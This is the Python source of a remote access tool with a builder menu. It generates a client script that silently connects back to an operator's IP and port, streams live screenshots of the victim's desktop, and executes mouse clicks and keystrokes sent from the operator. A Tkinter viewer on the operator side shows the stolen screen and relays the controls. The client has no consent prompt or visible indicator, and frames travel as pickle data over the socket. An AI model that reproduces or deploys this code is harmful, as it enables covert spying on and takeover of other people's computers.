import os
import socket
import pickle
import struct
import cv2
import threading
import platform
import tkinter as tk
from PIL import Image, ImageTk

LOGO = """
       _________________
      |  ___   _   ___  |
      | |   | | | |   | |
      | |___| |_| |___| |
      |  ___   _   ___  |
      | |   | | | |   | |
      | |___| |_| |___| |
      |  _ _   _   _ _  |
      | |   | | | |   | |
      | |___| |_| |___| |
      |  ___   _   ___  |
      | |   | | | |   | |
      | |___| |_| |___| |    
      |       _ _       |
      |      |   |      |
______|______|___|______|______
      [Remote Access Tool]
"""

def clear():
    if platform.system() == "Windows": os.system('cls')
    else: os.system('clear')

def build_client():
    ip = input("Enter Server IP: ")
    port = input("Enter Port: ")
    filename = "client_built.py"
    
    # ADDED 'import threading' and keyboard support to the template
    script_content = f"""import socket, pyautogui, cv2, pickle, struct, numpy as np, time, platform, threading
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connected = False
while not connected:
    try:
        client.connect(("{ip}", {port}))
        connected = True
    except:
        time.sleep(2)

info = f"{{platform.system()}} ({{platform.node()}})"
client.send(info.encode().ljust(64))

def listen_commands():
    while True:
        try:
            data = client.recv(1024).decode()
            if data.startswith("CLICK:"):
                _, x, y = data.split(":")
                pyautogui.click(int(x), int(y))
            elif data.startswith("KEY:"):
                key = data.split(":")[1]
                if len(key) > 1: pyautogui.press(key.lower())
                else: pyautogui.write(key)
        except: break

threading.Thread(target=listen_commands, daemon=True).start()

try:
    while True:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        res, enc = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
        data = pickle.dumps(enc)
        client.sendall(struct.pack("Q", len(data)) + data)
except: pass
finally: client.close()
"""
    with open(filename, "w") as f:
        f.write(script_content)
    print(f"[+] Fixed client saved as {filename}")

def start_viewer(conn, device_name):
    def update_ui():
        root = tk.Tk()
        root.title(f"Live Feed: {device_name}")
        root.configure(bg="black")
        
        lbl = tk.Label(root, bg="black")
        lbl.pack(fill="both", expand=True)

        data = b""
        payload_size = struct.calcsize("Q")
        remote_w, remote_h = 1, 1 

        def handle_click(event):
            win_w, win_h = root.winfo_width(), root.winfo_height()
            real_x = int((event.x / win_w) * remote_w)
            real_y = int((event.y / win_h) * remote_h)
            try: conn.send(f"CLICK:{real_x}:{real_y}".encode())
            except: pass

        def handle_key(event):
            key = event.keysym
            try: conn.send(f"KEY:{key}".encode())
            except: pass

        lbl.bind("<Button-1>", handle_click)
        root.bind("<Key>", handle_key)

        def stream():
            nonlocal data, remote_w, remote_h
            first_frame = True
            while True:
                try:
                    while len(data) < payload_size:
                        packet = conn.recv(8192)
                        if not packet: break
                        data += packet
                    packed_size, data = data[:payload_size], data[payload_size:]
                    msg_size = struct.unpack("Q", packed_size)[0]
                    while len(data) < msg_size: data += conn.recv(8192)
                    frame_data, data = data[:msg_size], data[msg_size:]

                    frame = cv2.imdecode(pickle.loads(frame_data), cv2.IMREAD_COLOR)
                    remote_h, remote_w, _ = frame.shape
                    
                    if first_frame:
                        scale = (root.winfo_screenheight() * 0.7) / remote_h
                        root.geometry(f"{int(remote_w*scale)}x{int(remote_h*scale)}")
                        first_frame = False

                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    img = Image.fromarray(frame).resize((root.winfo_width(), root.winfo_height()), Image.Resampling.NEAREST)
                    photo = ImageTk.PhotoImage(image=img)
                    lbl.config(image=photo)
                    lbl.image = photo
                except:
                    root.destroy()
                    break

        threading.Thread(target=stream, daemon=True).start()
        root.mainloop()

    update_ui()

def start_listener():
    port = int(input("Enter Port: "))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(5)
    print(f"[*] Waiting for connection on {port}...")
    
    conn, addr = s.accept()
    device_name = conn.recv(64).decode().strip()
    print(f"[+] Connected to: {device_name}")
    start_viewer(conn, device_name)

def main():
    while True:
        clear(); print(LOGO)
        print("1. Build Client\n2. Listen for Connection\n3. Exit")
        choice = input("\n> ")
        if choice == "1": build_client(); input("\nPress Enter...")
        elif choice == "2": start_listener(); input("\nPress Enter...")
        elif choice == "3": break

if __name__ == "__main__":
    main()